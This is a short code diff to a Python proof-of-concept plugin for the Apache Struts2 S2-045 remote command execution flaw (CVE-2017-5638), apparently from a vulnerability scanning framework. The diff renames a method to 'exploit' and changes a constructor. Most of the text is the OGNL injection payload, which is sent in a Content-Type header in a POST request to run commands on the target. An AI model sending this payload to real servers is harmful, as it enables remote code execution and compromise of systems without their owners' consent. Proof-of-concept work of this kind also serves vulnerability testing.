@@ -11,7 +11,7 @@ class poc(Plugin):
     querytype = 'site'
     description = 'Struts2-045 remote command execute(CVE-2017-5638)'
     
-    def __init__(self, v):
+    def __init__(self):
     
         self.payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):\
     ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))\
@@ -21,7 +21,7 @@ class poc(Plugin):
     .getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 
         
-    def start(self, target):
+    def exploit(self, target):
         
         headers = {'Content-Type': self.payload}
         response = self.query(method='POST', url=target, headers=headers)
